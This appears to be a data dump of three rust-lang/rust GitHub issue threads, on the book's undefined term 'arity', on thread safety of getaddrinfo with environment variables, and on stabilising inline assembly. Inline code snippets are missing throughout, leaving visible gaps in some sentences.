rust-lang/rust/21568,0.0475938145,rust-lang,rust,"Book uses academic term ""arity"" without definition",4304,60,29,0,0,"In the Compound Data Types chapter of the book, the term ""arity"" is used without any prior definition I've learned enough formal logic and programming language theory to know what ""arity"" means, but I suspect most programmers don't. (Neither does my spell checker!) And the book otherwise seems to be trying to use clear language and be readable by non-experts. I suggest changing it to  Sounds great to me, feel free to submit a pull request )  Maybe with ""types"" instead of ""type"".  Or  I'd prefer just defining . it's a really useful word.  It's a useful word if you do a lot of functional programming or formal logic ;-), but the rest of the book is very informal and tries hard to make J. Random Scripter feel comfortable, so tossing in a $20 word seems out of place. Maybe  But the arity refers to just the number of entries, not their types. It's an incomplete description and so awkward to define in passing.  I don't think arity need be mentionned. Saying ""contain the same types"" seems sufficient. That already has to deal with (A, B) vs (B, A). Seems to me that also deals with (A, A) vs (A, A, A).  I had seen  in the docs to, and it simply pissed me off.  Why force me to use google and dictionary.com?  Please just explain things in plain english, the docs is not a place to show off how smart you are and how advanced your english is.  @friend it's not to show off fancy language, it's a computer science term. It's a good word for any programmer to know.  @friend sometimes plain english is simply better, these are docs are supposed to make it easy to learn rust.  The reader is not likely interested in a course on rarely used computer science terms.  Just have a look part of the definition of  on wikpedia.  Cartesian product? dyadic? valency? adicity and degree? This term  comes off as very elitist.  Save it for your own blog, not the docs. ""In logic, mathematics, and computer science, the arity Listeni/ˈærɨti/ of a function or operation is the number of arguments or operands the function or operation accepts. The arity of a relation (or predicate) is the dimension of the domain in the corresponding Cartesian product. (A function of arity n thus has arity nplus one considered as a relation.) The term springs from words like unary, binary, ternary, etc. Unary functions or predicates may be also called ""monadic""; similarly, binary functions may be called ""dyadic"". In mathematics arity may also be named rank,[1][2] but this word can have many other meanings in mathematics. In logic and philosophy, arity is also called adicity and degree.[3][4] In linguistics, arity is usually named valency.[5]""  plus one for keeping  somehow. It's well worth learning the word imho.  @friend This attitude is not going to serve you well in Rust.  It's not ""elitist"" to define precise terms for concepts that may be hard to express in ""plain english"". Of course one should define them in the text.  And in this case I don't think it's worth the trouble, because there are satisfactory explanations in ""plain english"" (see above).  So, I'm in agreement with you that the text needs to be changed.  But turning it into a rant about ""elites"" is just gross and unhelpful. The thing is... when people ignore your ideas while making fun of the words you use to express them, it really does breed a bitterness and elitism, and ultimately a sort of siege mentality that you'll see in a lot of functional programming communities.  It's not pretty, and I don't want Rust to go the same way, although I don't think it's particularly likely. So please let's leave the culture war out of it.  Technical writing is hard. There are always many tradeoffs.  Just because someone uses a word you don't know, doesn't mean they're maliciously trying to feel superior to you.  My unsolicited advice Embrace being around people who know things you don't. Then you can learn from them. I hope that the Rust community will always be a safe place for that.  Slight modification. I think signature is the right word. Even if signatures' definition is unclear, the example should make it's meaning understandable; something the arity lacked.  You can assign tuples onto each other if the signature matches  @friend The PR that addresses this ticket has been merged. Should this issue be closed now?  Yes, thanks. ",13,4,189,0,0,85,7,
rust-lang/rust/27970,0.06568192249999999,rust-lang,rust,Does getaddrinfo need to take the ENV lock?,1240,10,7,0,0,"Like the documentation for our  (setenv) says, care must be taken with mutating environment variables in a multithreaded program. See this glibc bug #13271 that says getaddrinfo may call getenv. It looks like we have an unsynchronized call to getaddrinfo and this may cause trouble with glibc/Linux. Seeing glibc's attitude to setenv in multithreaded programs,  seems like a big hazard in general(?). Discovered as an issue tangential to #27966 cc @friend  If we did take this route I'd want to convert the environment lock to a rwlock to ensure that we could at least have parallel dns queries. Also cc #27705.  Yeah, either way the situation is tricky. We get tangled up in glibc internals.  I found the wording on this page also particularly interesting The getaddrinfo function is indeed marked with this tag  is just broken, as I commented on issue #24741 Even without low-level races,  is not quite safe because you can change a variable (such as ), do something, and change it back to the original value, without impacting something else in the process which runs at the same time. This problem would not go away if we provided thread-safe environment access at the libc layer. Therefore, I'm surprised the function isn't marked **. ",7,0,41,0,0,18,1,
rust-lang/rust/29722,0.047160994,rust-lang,rust,Tracking issue for `asm` (inline assembly),71214,759,523,0,20,"This issue tracks stabilization of inline assembly. The current feature has not gone through the RFC process, and will probably need to do so prior to stabilization.  Will there be any difficulties with ensuring the backward-compatibility of inline assembly in stable code?  @friend has a great comment at  that I'm reproducing here for posterity  I personally think it would be better to do what Microsoft did in MSVC x64 define a (nearly-)comprehensive set of intrinsic functions, for each asm instruction, and do ""inline asm"" exclusively through those intrinsics. Otherwise, it's very difficult to optimize the code surrounding inline asm, which is ironic since many uses of inline asm are intended to be performance optimizations. One advantage of the instrinsic-based approach is that it doesn't need to be an all-or-nothing thing. You can define the most needed intrinsics first, and build the set out incrementally. For example, for crypto, having , . Note that the work to do the instrinsics seems to have been done quite thoroughly already  the intrinsics would be a good idea to add even if it were ultimately decided to support inline asm, as they are much more convenient to use (based on my experience using them in C and C++), so starting with the intrinsics and seeing how far we get seems like a zero-risk-of-being-wrong thing.  Intrinsics are good, but  can be used for more than just inserting instructions. For example, see the way I'm generating ELF notes in my  crate.  expect that kind of hackery will be rare, but I think it's still a useful thing to support.  @friend Inline asm is also useful for code that wants to do its own register/stack allocation (e.g. naked functions).  @friend yeah those are some excellent reasons to use intrinsics where possible. But it's nice to have inline assembly as the ultimate excape hatch.  @friend Note that  is kind of a superset of intrinsics as you can build the latter using the former. (The common argument against this reasoning is that the compiler could theoretically optimize through intrinsics, e.g. hoist them out of loops, run CSE on them, etc. However, it's a pretty strong counterpoint that anyone writing asm for optimization purposes would do a better job at that than the compiler anyways.) See also  and  for cases where inline asm works but intrinsics don't. On the other hand, intrinsics critically depend on a ""sufficiently smart compiler"" to achieve at least the performance one would get with a hand-rolled asm implementation. My knowledge on this is outdated but unless there has been significant progress, intrinsics-based implementations are still measurably inferior in many - if not most - cases. Of course they're much more convenient to use but I'd say that programmers really don't care much about that when they're willing to descend into the world of specific CPU instructions. Now another interesting consideration is that intrinsics could be coupled with fallback code on architectures where they're not supported. This gives you the best of both worlds Your code is still portable - it's can just employ some hardware accelerated operations where the hardware supports them. Of course this only really pays off for either very common instructions or if the application has one obvious target architecture. Now the reason why I'm mentioning this is that while one could argue that this may potentially even be undesirable with compiler-provided intrinsics (as you'd probably care about whether you actually get the accelerated versions plus compiler complexity is never good) I'd say that it's a different story if the intrinsics are provided by a library (and only implemented using inline asm). In fact, this is the big picture I'd prefer even though I can see myself using intrinsics more than inline asm. (I consider the intrinsics from RFC #1199 somewhat orthogonal to this discussion as they exist mostly to make SIMD work.)  @friend I'm not sure what you mean here. It's true that the compiler can't break down the asm into its individual operations to do strength reduction or peephole optimizations on it. But in the GCC model, at least, the compiler can allocate the registers it uses, copy it when it replicates code paths, delete it if it's never used, and so on. If the asm isn't volatile, GCC has enough information to treat it like any other opaque operation like, say, . The whole motivation for the weird design is to make inline asm something the optimizer can mess with. But I haven't used it a whole lot, especially not recently. And I have no experience with LLVM's rendition of the feature. So I'm wondering what's changed, or what I've misunderstood all this time.  We discussed this issue at the recent work week as @friend's survey of the  ecosystem has the  macro as one of the more commonly used features. Unfortunately we didn't see an easy way forward for stabilizing this feature, but I wanted to jot down the notes we had to ensure we don't forget all this.  First, we don't currently have a great specification of the syntax accepted in the  macro. Right now it typically ends up being ""look at LLVM"" which says ""look at clang"" which says ""look at gcc"" which doesn't have great docs. In the end this typically bottoms out at ""go read someone else's example and adapt it"" or ""read LLVM's source code"". For stabilization a bare minimum is that we need to have a specification of the syntax and documentation.  Right now, as far as we know, there's no stability guarantee from LLVM. The  macro is a direct binding to what LLVM does right now. Does this mean that we can still freely upgrade LLVM when we'd like? Does LLVM guarantee it'll never ever break this syntax? A way to alleviate this concern would be to have our own layer that compiles to LLVM's syntax. That way we can change LLVM whenever we like and if the implementation of inline assembly in LLVM changes we can just update our translation to LLVM's syntax. If  is to become stable we basically need some mechanism of guaranteeing stability in Rust.  Right now there are quite a few bugs related to inline assembly. The A-inline-assembly tag is a good starting point, and it's currently littered with ICEs, segfaults in LLVM, etc. Overall this feature, as implemented today, doesn't seem to live up to the quality guarantees others expect from a stable feature in Rust.  Stabilizing inline assembly may make an implementation of an alternate backend very difficult. For example backends such as miri or cretonne may take a very long time to reach feature parity with the LLVM backend, depending on the implementation. This may mean that there's a smaller slice of what can be done here, but it's something important to keep in mind when considering stabilizing inline assembly.    Despite the issues listed above we wanted to be sure to at least come away with some ability to move this issue forward! To that end we brainstormed a few strategies of how we can nudge inline assembly towards stabilization. The primary way forward would be to investigate what clang does. Presumably clang and C have effectively stable inline assembly syntax and it may be likely that we can just mirror whatever clang does (especially wrt LLVM). It would be great to understand in greater depth how clang implements inline assembly. Does clang have its own translation layer? Does it validate any input parameters? (etc) Another possibility for moving forward is to see if there's an assembler we can just take off the shelf from elsewhere that's already stable. Some ideas here were nasm or the plan9 assembler. Using LLVM's assembler has the same problems about stability guarantees as the inline assembly instruction in the IR. (it's a possibility, but we need a stability guarantee before using it)  I would like to point out that LLVM's inline asm syntax is different from the one used by clang/gcc. Differences include  LLVM uses  instead of . LLVM doesn't support named asm operands . LLVM supports different register constraint types for example  instead of  on x86. LLVM support explicit register constraints (). In C you must instead use register asm variables to bind a value to a register (). LLVM  and  constraints are basically broken. Clang translates these into indirect memory constraints  and  and pass the address of the variable to LLVM instead of the variable itself. etc...  Clang will convert inline asm from the gcc format into the LLVM format before passing it on to LLVM. It also performs some validation of the constraints for example it ensures that  operands are compile-time constants,  In light of this I think that we should implement the same translation and validation that clang does and support proper gcc inline asm syntax instead of the weird LLVM one.  There's an excellent video about summaries with D, MSVC, gcc, LLVM, and Rust with slides online  As someone who'd love to be able to use inline ASM in stable Rust, and with more experience than I want trying to access some of the LLVM MC APIs from Rust, some thoughts  Inline ASM is basically a copy-paste of a snippet of code into the output .s file for assembling, after some string substitution. It also has attachments of input and output registers as well as clobbered registers. This basic framework is unlikely to ever really change in LLVM (although some of the details might vary slightly), and I suspect that this is a fairly framework-independent representation.  Constructing a translation from a Rust-facing specification to an LLVM-facing IR format isn't hard. And it might be advisable--the rust  syntax for formatting doesn't interfere with assembly language, unlike LLVM's  and GCCs  notation.  LLVM does a surprisingly bad job in practice of actually identifying which registers get clobbered, particularly in instructions not generated by LLVM. This means it's pretty much necessary for the user to manually specify which registers get clobbered.  Trying to parse the assembly yourself is likely to be a nightmare. The LLVM-C API doesn't expose the MCAsmParser logic, and these classes are quite annoying to get working with bindgen (I've done it).  For portability to other backends, as long as you keep the inline assembly mostly on the level of ""copy-paste this string with a bit of register allocation and string substitution"", it shouldn't inhibit backends all that much. Dropping the integer constant and memory constraints and keeping just register bank constraints shouldn't pose any problems.    I've been having a bit of play to see what can be done with procedural macros. I've written one that converts GCC style inline assembly to rust style  I've also started working on one that uses a DSL where the user doesn't have to understand the constraints and they're all handled automatically. So I've come to the conclusion that I think rust should just stabilise the bare building blocks, then the community can iterate out of tree with macros to come up with best solutions. Basically, just stabilise the llvm style we have now with only ""r"" and ""i""  and maybe ""m"" constraints, and no clobbers. Other constraints and clobbers can be stabilised later with their own mini rfc type things.  Personally I'm starting to feel as though stabilizing this feature is the sort of massive task that will never get done unless somehow someone hires a full-time expert contractor to push on this for a whole year. I want to believe that @friend's suggestion of stabilizing  piecemeal will make this tractable. But if it isn't, then we need to stop trying to reach for the satisfactory solution that will never arrive and reach for the unsatisfactory solution that will stabilize  as-is, warts, ICEs, bugs and all, with bright bold warnings in the docs advertising the jank and nonportability, and with the intent to deprecate someday if a satisfactory implementation should ever miraculously descend, God-sent, on its heavenly host. IOW, we should do exactly what we did for  (and of course, just like for , we can have a brief period of frantic band-aiding and leaky future-proofing). I'm sad at the ramifications for alternative backends, but it's shameful for a systems language to relegate inline assembly to such a limbo, and we can't let the hypothetical possibility of multiple backends continue to obstruct the existence of one actually usable backend.  As a data point, I happen to be working on a crate right now that depends on  for the sole purpose of emitting some asm with stable Rust  it certainly has its advantages, I'm a bit wary of the ""stabilize building blocks and leave the rest to proc-macros""-approach. It essentially outsources the design, RFC and implementation process to whoever wants to do the job, potentially no one. Of course having weaker stability/quality guarantees is the entire point (the tradeoff is that having something imperfect is already much better than having nothing at all), I understand that. At least the building blocks should be well-designed - and in my opinion,  definitely isn't. I can't remember ever getting the order right on the first try, I always have to look it up. ""Magic categories separated by colons where you specify constant strings with magic characters that end up doing magic things to the variable names that you also just mash in there somehow"" is just bad.  One idea, … Today, there is already a project, named dynasm, which can help you generate assembly code with a plugin used to pre-process the assembly with one flavor of x64 code. This project does not answer the problem of inline assembly, but it can certainly help, if rustc were to provide a way to map variables to registers, and accept to insert set of bytes in the code, such project could also be used to fill-up these set of bytes. This way, the only standardization part needed from rustc point of view, is the ability to inject any byte sequence in the generated code, and to enforce specific register allocations.  This removes all the choice for specific languages flavors. Even without dynasm, this can also be used as a way to make macros for the cpuid / rtdsc instructions, which would just be translated into the raw sequence of bytes. I guess the next question might be if we want to add additional properties/constraints to the byte-sequences.  If we want to continue to use LLVM's integrated assembler (I assume this is faster than spawning an external assembler), then stabilization means stabilizing on exactly what LLVM's inline assembly expressions and integrated assembler support&mdash;and compensating for changes to those, should any occur. If we're willing to spawn an external assembler, then we can use any syntax we want, but we're then foregoing the advantages of the integrated assembler, and exposed to changes in whatever external assembler we're calling.  I think it would be strange to stabilize on LLVM's format when even Clang doesn't do that.  Presumably it does use LLVM's support internally, but it presents an interface more like GCC.  I'm 100% fine with saying ""Rust supports exactly what Clang supports"" and calling it a day, especially since AFAIK Clang's stance is ""Clang supports exactly what GCC supports"". If we ever have a real Rust spec, we can soften the language to ""inline assembly is implementation-defined"". Precedence and de-facto standardization are powerful tools. If we can repurpose Clang's own code for translating GCC syntax to LLVM, all the better. The alternative backend concerns don't go away, but theoretically a Rust frontend to GCC wouldn't be much vexed. Less for us to design, less for us to endlessly bikeshed, less for us to teach, less for us to maintain.  If we stabilize something defined in terms of what clang supports, then we should call it . The  name should be reserved for something that's been designed through a full RFC process, like other major Rust features. #bikeshed There are a bunch of things I'd like to see in Rust inline assembly  The template-with-substitutions pattern is ugly. I'm always jumping back and forth between the assembly text and the constraint list. Brevity encourages people to use positional parameters, which makes legibility worse. Symbolic names often mean you have the same name repeated three times in the template, naming the operand, and in the expression being bound to the operand. The slides mentioned in Alex's comment show that D and MSVC let you simply reference variables in the code, which seems much nicer.  Constraints are both hard to understand, and (mostly) redundant with the assembly code. If Rust had an integrated assembler with a sufficiently detailed model of the instructions, it could infer the constraints on the operands, removing a source of error and confusion. If the programmer needs a specific encoding of the instruction, then they would need to supply an explicit constraint, but this would usually not be necessary.   Norman Ramsey and Mary Fernández wrote some papers about the New Jersey Machine Code Toolkit way back when that have excellent ideas for describing assembly/machine language pairs in a compact way. They tackle (Pentium Pro-era) iA-32 instruction encodings; it is not at all limited to neat RISC ISAs.  I'd like to reiterate again the conclusions from the most recent work week  Today, as far as we know, there's basically no documentation for this feature. This includes LLVM internals and all. We have, as far as we know, no guarantee of stability from LLVM. For all we know the implementation of inline assembly in LLVM could change any day. This is, currently, a very buggy feature in rustc. It's chock full of (at compile time) segfaults, ICEs, and weird LLVM errors. Without a specification it's nigh impossible to even imagine an alternate backend for this.  To me this is the definition of ""if we stabilize this now we will guarantee to regret it in the future"", and not only ""regret it"" but seems very likely for ""causes serious problems to implement any new system"". At the absolute bare minimum I'd firmly believe that bullet (2) cannot be compromised on (aka the definition of stable in ""stable channel""). The other bullets would be quite sad into forgo as it erodes the expected quality of the Rust compiler which is currently quite high.  @friend wrote I would think that, in practice, it would be quite difficult to infer clobber lists. Just because a machine-language fragment uses a register doesn't mean it clobbers it; perhaps it saves it and restores it. Conservative approaches could discourage the code generator from using registers that would be fine to use.  @friend wrote The LLVM docs guarantee ""Newer releases can ignore features from older releases, but they cannot miscompile them."" (with respect to IR compatibility). That rather constrains how much they can change inline assembly, and, as I argued above, there's not really any viable replacement at LLVM level that would radically change semantics from the current situation (unlike, say, the ongoing issues around poison and undef). Saying that its prospective instability precludes using it as a base for a Rust  block is therefore somewhat dishonest. Now that's not to say there are other problems with it (poor documentation, although that has improved; constraint suckiness; poor diagnostics; and bugginess in less-common scenarios are ones that come to mind). My biggest worry in reading the thread is that we make the perfect be the enemy of the good. In particular, I worry that searching for some magic DSL intermediary is going to take a few years to try to wrangle into usable form for inline-asm as people discover that integrating asm parsers and trying to get them to work with LLVM's cause more problems in edge cases.  Are LLVM really guaranteeing that they'll never miscompile a feature whose behavior they've never specified? How would they even decide if a change was a miscompilation or not? I could see it for the other parts of the IR, but this seems like a lot to expect.  Clang doesn't do that because it aims to be able to compile code that was written for GCC. rustc doesn't have that aim. The GCC format isn't very ergonomic so ultimately I think we don't want that, but whether that would be better to go with for now I'm unsure. There's a lot of (nightly) code out there using the current Rust format that would break if we changed to GCC style so it's probably only worth changing if we can come up with something notably better. Agreed. At the very least I prefer the raw LLVM format where the constraints and clobbers are all in one list. Currently there is a redundancy having to specify ""="" prefix and put it in the output list. I also think how LLVM treats it more like a function call where the outputs are the result of the expression, AFAIK the current  implementation is the only part of rust that has ""out"" parameters. AFAIK LLVM doesn't event try to do this as the main reason for inline assembly is to include some code that LLVM doesn't understand. It only does register allocation and template substitution without looking at the actual assembly.  (Obviously it parses the actually assembly at some stage to generate the machine code, but I think that happens later) I'm not sure there can ever be an alternative to using the integrated inline assembler because some how you would have to get LLVM to allocate registers for it. For global assembly though, an external assembler would be workable. Regarding breaking changes in the LLVM inline assembler, we are in the same boat as Clang. That is, if they make some changes, we just have to work around them when they happen.  I'm all for it. plus one @friend Going by @friend 's suggestion quoted above, anyone using  will happily be able to still use it. If GCC's assembly syntax is truly not specified or documented after 30 years, then it seems safe to assume that either producing a documented assembly sublanguage is a task that is either so difficult that it is beyond Rust's ability to accomplish given our limited resources, or that people who want to use assembly simply don't care. It seems unlikely that GCC/Clang's implementation of inline assembly will ever change, since that would break all C code written since the 90s. At the risk of being callous, the prospect of alternative backends is moot if Rust as a language does not survive due to its embarrassing inability to drop into assembly. Nightly does not suffice, unless one wants to tacitly endorse the idea that Nightly is Rust, which does more to undermine Rust's stability guarantee than the prospect of LLVM changes. I'm not lying when I say that every day I am thankful for the attitude of the Rust developers and the enormous standard of quality that they hold themselves to (in fact sometimes I wish y'all would slow down so you can maintain that quality without burning yourselves out like Brian did). However, speaking as someone who was here when luqmana added the  macro four years ago, and who has observed no progress since then at getting this stabilized, and who is sad that crypto in Rust is still impossible and that SIMD in Rust doesn't even have a workaround while the cross-platform interface is being slowly determined, I feel despondent. If I seem emphatic here it's because I view this issue as existential to the survival of the project. It may not be a crisis right this moment, but it will take time to stabilize anything at all, and we don't have the years that it will take to design and implement a world-class assembly dialect from scratch (proven by the fact that we have made no progress towards this in the last four years). Rust needs stable inline assembly sometime in 2018. We need prior art to pull that off. The  situation acknowledged that sometimes worse is better. Once again, I'm begging someone to prove me wrong.  FWIW and coming late to the party I like what @friend 's the cologne talk proposed. For those that haven't watched it, this is the gist of it  How about the following strategy rename current  to  (plus maybe some minor changes) and state that it's behavior is implementation detail of LLVM, thus Rust stability guarantee does not fully extend to it? Problem of different backends should be more or less solved with  like functionality for conditional compilation depending on the used backend. Yes, such approach will blur Rust stability a bit, but keeping assembly in limbo like this is damaging for Rust in its own way.  I've posted a pre-RFC with an alternative syntax proposal to the internals forum  Feedback welcome.  It looks to me like the best is definitely the enemy of the kind-of-ok here. I fully support sticking a  or  or  macro (or any proper subset thereof) into stable with compatible syntax and semantics for now, while a better solution is worked out. I don't see supporting such a thing forever as a huge maintenance burden the more sophisticated systems proposed above look like they'd pretty easily support just turning the old-style macros into syntactic saccharine for the new one. I have a binary program  which requires inline assembly for the x86_64  instruction. This inline assembly is the only thing keeping this code in nightly. The code was derived from a 12-year-old C program. Right now, my assembly is conditioned on     #[cfg(any(target_arch = ""x86"", target_arch = ""x86_64""))]  and then gets the  info to see if  is present. It would be nice to have something in Rust similar to the recent Google cpu_features library  in Rust, but c'est la vie. Because this is a demo program as much as anything, I'd like to keep the inline assembly. For real programs, the  intrinsic would be sufficient — except that getting it to use  requires passing ""-C target-cpu=native"" to Cargo, probably through  (see issue #1137 and several related issues) since distributing a  with my source doesn't seem like a great idea, which means that right now I've got a Makefile calling Cargo. In short, it would be nice if one could use Intel's and others' fancy popcount instruction in real applications, but it seems harder than it needs to be. Intrinsics aren't entirely the answer. Current  is an ok answer were it available in stable. It would be great to have a better syntax and semantics for inline assembly, but I don't really need it. It would be great to be able to specify  directly in , but it wouldn't really solve my problem. Sorry, rambling. Just thought I'd share why I care about this.  @friend I don‘t understand, why do you so desperately need to compile to popcnt? The only reason I can see is performance and IMO you should definitely just use count_ones() in that case. What you‘re looking for is not inline asm but target_feature (rust-lang/rfcs#2045) so you can tel the compiler that it‘s allowed to emit popcnt.  @friend you don't even need to use inline assembly for this, just use   to query whether the cpu your binary runs supports the  instruction (it will resolve this at compile-time if its possible to do so). ♠coresimdpopcntpopcnt` instruction.  @friend It's a bit off-topic, but this statement is not strictly true.  uses  under the hood, thus if  feature will not be enabled by crate user and crate author will forget to use  this intrinsic will get compiled into ineffective assembly and there is no safeguards against it.  It also uses  to enable the  feature for the intrinsic unconditionally, independently of what the crate user enables.  This function looks like undefined behavior to me  First of all, apologies for the derailing the discussion. Just wanted to reiterate my main point, which was ""I fully support sticking a gcc_asm! or clang_asm! or llvm_asm! macro (or any proper subset thereof) into stable with compatible syntax and semantics for now, while a better solution is worked out. "" The point of the inline assembly is that this is a popcount benchmark / demo. I want a true guaranteed  instruction when possible both as a baseline and to illustrate how to use inline assembly. I also want to guarantee that  uses a popcount instruction when possible so that Rustc doesn't look terrible compared to GCC and Clang. Thanks for pointing out . I'll think about how to use it here. I think I want to bench  regardless of what CPU the user is compiling for and regardless of whether it has a popcount instruction. I just want to make sure that if the target CPU has popcount  uses it. The / crates looks nice, and should probably be enabled for these benchmarks. Thanks! For this app I'd prefer to use as little outside the standard language features as possible (I'm already feeling guilty about ). However, these facilities look too good to ignore, and it looks like they're well on their way to becoming ""official"".  There’s an idea floated around by @friend where there could be some implementation which goes from some representation of code to machine bytes (could be a proc-macro crate or something?) and then those bytes are included directly into the particular location in code. Splicing arbitrary code bytes into arbitrary places within a function seems like a much easier problem to solve (although ability to specify inputs, outputs and their constraints as ell as clobbers would still be necessary). cc @friend  @friend it's a little more than just a chuck of machine code though, you also have to be careful about input, output and clobber registers. If the ASM chunk says that it wants a certain variable in %rax and that it will clobber %esi you need to make sure that the surrounding code plays nice. Also if the developer lets the compiler allocate the registers you'll probably want to optimize the allocation to avoid spilling and moving values around.  @friend , indeed you will have to specify how variables are associated to specific registers, and which registers are clobbered, but all of these is smaller than standardizing any assembly language, or any LLVM assembly language. Standardizing on byte sequences, is probably the easiest way forward by moving the assembly flavor to a driver / proc-macro. One issue of having verbatim bytes instead of proper inline assembly, is that the compiler would have no option for doing register alpha-renaming, which I do not expect people writing inline assembly are expecting either.  But how would that handle register allocation if I want to let the compiler handle that? For instance, using GCC's (atrocious) syntax In something like this I let the compiler allocate the registers, expecting that it will give me whatever is the most convenient and efficient. For instance on x86 64 if  is the return value then the compiler might allocate  and if  is a function parameter it might already be available in some register. Of course the compiler only knows exactly how it will allocate registers pretty late in the compilation sequence (especially if it's not as trivial as simply function params and return values). Would your proposed solution work with something like that?  @friend I have to say I'm a bit confused by this proposal. First of all, standardizing assembly language was never something we wanted to achieve with inline assembly. At least to me, the premise was always that the assembly language used by the system assembler would be accepted. The problem is not getting the assembly parsed/assembled, we can pass that off to LLVM easily. The problem is with filling templated assembly (or giving LLVM the required information to do so), and specifying inputs, outputs and clobbers. The later problem is not actually solved by your proposal. It is however alleviated, because you wouldn't/couldn't support classes of registers (which @friend asks about), but just concrete registers. At the point where constraints are simplified to that extend, it is actually just as easy to support ""real"" inline assembly. The first argument is an string containing (non-templated) assembly, the other arguments are the constraints. This is somewhat easily mapped to LLVM's inline assembler expressions. Inserting raw bytes on the other hand is not as far as I know (or can tell from the LLVM IR Reference Manual) supported by LLVM. So we'd basically be extending LLVM IR, and reimplementing a feature (assembling system assembly) that is already present in LLVM using separate crates.  @friend So how would that be done? I have a sequence of bytes with hardcoded registers with basically means that the input/out registers, clobbers, etc. are all hardcoded inside this sequence of bytes. Now inject this bytes somewhere in my rust binary. How do I tell rustc which registers are input/output, which registers got clobbered, etc.? How is this a smaller problem to solve than stabilizing inline assembly ? It looks to me that this is exactly what inline assembly does, what am I missing?  @friend This would not be possible, as the raw of bytes does not allow alpha renaming of registers, and the registers would have to be enforced by the code sequence ahead. @friend My understanding, is that relying on the system assembler is not something we want to rely on, but more an accepted flaw as part of the asm! macro.  Also relying on asm! being the LLVM syntax would be painful for the development of additional backend. @friend The idea would be to have a list of inputs, outputs, and clobbered registers, where the inputs would be a tuple of the register name associated with a (mutable) reference or copy, the clobbered register would be a list of register names, and the output would be a list of output register would form a tuple of named register to which are associated types. This code sequence might be the output of some compiler procedural macro, which might look like These sequences, will not be able to directly embedde any symbol or addresses and they would have to be computed and given as registers.  I am sure we can figure out how do add the ability to insert some symbol addresses within the byte sequence later on. The advantage of this approach is that only the list of registers and constraints have to be standardized, and this is something that would easily be supported by any future backend.  @friend I don't think that's an accurate assessment? With the minor exception of the two different syntaxes for x86 assembly, assembly syntax is largely standard and portable. The only issue with the system assembler might be that it lacks newer instructions, but that's a niche situation not worth optimizing for. The actual problem is the glue into register allocation. But, as far as the actual assembly string itself is concerned, this merely means someone has to do some string substitution stuff and maybe some parsing. I agree that LLVM's (or gcc's) syntax for this stuff is crap, but moving to precompiled bytes means that any asm crate now needs to install a full assembler and possibly a full register allocator (or make programmers hand-allocate registers), or attempt to use the system assembler. At that point, it doesn't seem like it's actually really adding much value.  @friend  crate uses macro handled by a plugin to assemble the assembly code and generate vectors of raw assembly code to be concatenated at runtime.  @friend maybe my uses cases are peculiar but lack of register renaming and letting the compiler allocate registers for me would be a bit of a deal-breaker because it either means that I need to be very lucky with my choice of registers and happen to ""hit right"" or the compiler will have to emit non-optimal code to shuffle registers around to match my arbitrary conventions. If the assembly blob doesn't integrate nicely with the surrounding compiler-emitted assembly I might as well just factor the ASM stub in an external C-style method in a stand-alone .s assembly file since function calls have the same type of register-allocation constraints. This already works today, although I suppose having it built into rustc might simplify the build system compared to having a standalone assembly file. I guess what I'm saying is that IMO your proposal doesn't get us very far compared to the current situation. And what if the ASM code calls external symbols that would be resolved by the linker? You need to pass that info around since you can't possibly resolve those until late in the compilation process. You'd have to pass there reference alongside your byte array and let the linker resolve them much later. @friend I'm not sure I understand what you mean by that, obviously ASM syntax is not portable across architectures. And even within the same architecture there are often variations and options that change the way the language is assembled. I can give MIPS as an example, there are two important configuration flags that tweak the assembler behaviour  and .  says whether the assembler is allowed to implicitly use the  (assembler temporary) register when assembling certain pseudo-instructions. Code that explicitly uses  to store data must be assembled with  or it'll break. asm     addui   $a0, 4     jal     some_func     addui   $a1, $s0, 3 asm    ldr   r2, =0x89abcdef ♠ Some code needs very peculiar alignment constraints (common when you're dealing with cache invalidation code for instance, you need to be sure that you don't take a saw to the branch you're sitting on). And there's the problem of handling external symbols that can't be resolved at this point in the compilation process as I mentioned earlier. I'm sure I could come up with peculiarities for a bunch of other architectures I'm less familiar with. For these reasons I'm not sure I'm very optimistic for the macro/DSL approach. I understand that having a random opaque string literal in the middle of the code isn't super elegant but I don't really see what integrating the full ASM syntax into rust one way or an other would give us except additional headaches when adding support for a new architecture. Writing an assembler is something that may seem trivial at a glance but could turn out to be very tricky if you want to support all the bells, whistles and quirks of all the architectures out there. On the other hand having a good way to specify bindings and clobbers however would be extremely valuable (compared to gcc's... perfectible syntax).  Hi guys, Sorry for bothering you, I only wanted to drop my two cents, because I'm just an user, and a very shy/quiet one indeed, oh, and a newcomer, I have just recently landed in Rust, but I'm already in love with it. But this assembly thing is just crazy, I mean, it's a three years span conversation, with a bunch of ideas and complains, but nothing that seems like a minimum consensus. Three years and not a RFC, it seems a little like a death end. I'm developing a humble math library (that hopefully will materialize in two or three crates), and for me (and I suspect that for any other fellow interested in write assembly in rust), the most important thing is to actually being able to do it! with a minimum guarantee that everything is not going to change the next day (that's what the unstable channel, and specially this conversation, makes me feel). I understand that everyone here wants the best solution, and maybe one day someone comes out with that one, but as for today I believe that the current macro is just fine (well, maybe a little restricting in some ways, but hopefully nothing that cannot be addressed in an incremental way). To write assembly is like the most important thing in a low level language, a very very necessary feature, and although I'm ok relying on cpp_build until this is fixed, I'm very afraid that if it takes a lot more time it will become a forever dependency. I don't know why, call it an irrational idea, but I find that having to call cpp to call assembly is a little sad, I want a pure rust solution.  FWIW Rust is not that special here, MSVC doesn‘t have inline asm for x86_64 either. They do have that really weird implementation where you can use variables as operands but that works for x86 only.  @friend Could you talk more about what you're using inline assembly for? We typically only see it used in OS-like situations, which are typically stuck on nightly for other reasons as well, and even then they barely use , so stabilizing  hasn't been a high-enough priority to design &amp; develop something that can properly survive outside LLVM and please everyone.  Additionally, most things can be done using the exposed platform intrinsics. x86 and x86_64 have been stabilized and other platforms are in progress. It's most people's expectation that these are going to accomplish 95-99% of the goals. You can see my own crate jetscii as an example of using some of the intrinsics.  We just merged a jemalloc PR that uses inline assembly to work around code generation bugs in LLVM -  . Somebody used inline assembly in this issue ( to work around a code generation bug in Rust (LLVM) that happened in the jetscii crate. Both happened in the last two weeks, and in both cases the users tried with intrinsics but the compiler failed them. When code generation for a C compiler happens to be unacceptable, worst case the user can use inline assembly and continue working in C. When this happens in stable Rust, right now we have to tell people to use a different programming language or wait an indeterminate amount of time (often in the order of years). That's not nice.  @friend Well, I'm writing a small matrix algebra library. Inside that library, I'm implementing the BLAS, maybe some LAPACK (not there yet) routines in Rust, because I wanted the library to be a pure rust implementation. It's nothing serious yet, but anyway, I wanted the user to be able to opt for some asm speed and fun, specially with the GEMM operation, that use to be essential (the most used, anyway, and if you follow the BLIS people approach it's all what you need), at least in x86/x86_64. And that's the full story. Obviously I 